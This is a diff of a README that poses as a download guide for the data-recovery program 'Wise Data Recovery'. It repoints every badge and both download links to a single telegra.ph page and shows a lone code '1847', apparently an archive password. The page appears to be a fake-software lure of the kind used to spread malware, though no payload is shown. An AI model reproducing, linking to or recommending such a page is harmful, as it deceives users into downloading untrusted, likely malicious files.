@@ -1,14 +1,14 @@
 # 💾 Wise Data Recovery — Download & Data Recovery Guide 2026
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Wise-Data-Recovery)]()
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)]()
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)]()
-[![Category](https://img.shields.io/badge/Category-Disk%20%26%20Data%20Tools-blue)]()
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)]()
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Wise-Data-Recovery)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-Disk%20%26%20Data%20Tools-blue)](https://telegra.ph/Download-05-21-39)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
-[![Download](og-image.png)](https://github.com/delugejaguarprepare/Wise-Data-Recovery/releases/download/v1.0/Setup.zip)
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Wise Data Recovery](https://img.shields.io/badge/Download%20Wise%20Data%20Recovery-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/delugejaguarprepare/Wise-Data-Recovery/releases/download/v1.0/Setup.zip)
+[![Wise Data Recovery](https://img.shields.io/badge/Download%20Wise%20Data%20Recovery-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
